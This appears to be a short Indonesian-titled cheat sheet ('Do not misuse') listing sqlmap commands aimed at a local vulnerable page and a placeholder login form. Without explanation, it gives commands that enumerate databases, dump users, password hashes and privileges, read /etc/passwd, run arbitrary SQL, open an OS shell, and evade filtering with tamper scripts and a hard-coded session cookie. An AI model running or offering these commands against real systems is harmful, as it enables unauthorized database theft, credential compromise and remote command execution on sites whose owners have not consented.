<h1>Jangan Disalah Gunakan</h1>
command :
</br>
python ./sqlmap.py -u "http://localhost/weak.php?id=10" --dbs
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" -b
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --users --passwords --privileges --roles --threads=10
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --current-user --is-dba --current-db --hostname --threads=10
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --file-read=/etc/passwd --threads=10
</br>
C:\xampp\htdocs
</br>
/var/www/html/
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --sql-query="select now();"
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --os-shell
</br>
python sqlmap.py -u "http://localhost/weak.php?id=10" --level=3 --risk=2 --cookie="PHPSESSID:1r4fk7m10s3sj0nkbgdu1a48v0" --batch -v2 -o --keep-alive --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" --no-cast --no-escape --tamper="space2comment,between"
</br>
python sqlmap.py -u 'http://alamatwebsite/login.php'--method POST --data "username=user&password=pass"
